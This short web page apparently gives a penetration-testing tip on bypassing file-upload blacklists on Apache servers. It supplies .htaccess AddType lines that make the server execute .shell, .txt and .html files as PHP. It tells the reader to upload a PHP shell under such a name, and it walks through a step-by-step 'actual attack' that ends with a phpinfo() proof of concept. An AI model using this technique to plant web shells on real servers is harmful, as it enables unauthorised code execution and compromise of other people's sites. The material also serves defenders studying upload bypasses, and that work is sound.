<title>Malicious .htaccess</title>
</head><body>A htaccess file is the configuration file in Apache server. Using one of its setting we can change the file type behavior. Now lets choose a file extention which is not blacklisted, one of my favorite in such cases is .shell extension. So here is a htaccess configration which you have to cope in a .htaccess file and then upload in the folder and then upload your php shell with a name shell.shell and boom!! it will execute.<br/>
<br/>
Warning, replacing this file may have consequences. Make sure it's backed up and client is ok with it.<br/>
--------- <br/>
AddType application/x-httpd-php .php .php3 .php4 .htm .html .txt <br/>
AddType application/x-httpd-php .shell<br/>
etc<br/>
<br/>
<br/>
<br/>
The Process of an Actual Attack <br/>
=============================== <br/>
1. A malicious user uploads a following '.htaccess' file. <br/>
<br/>
.htaccess <br/>
--------- <br/>
AddType application/x-httpd-php .php .php3 .php4 .htm .html .txt <br/>
<br/>
2. A malicious user uploads a following .txt file. <br/>
test.txt <br/>
-------- <br/>
&lt;? phpinfo(); ?&gt;<br/>
<br/>
3. The PHP script is executed, because the .txt file is modified to executethe PHP script. <br/>
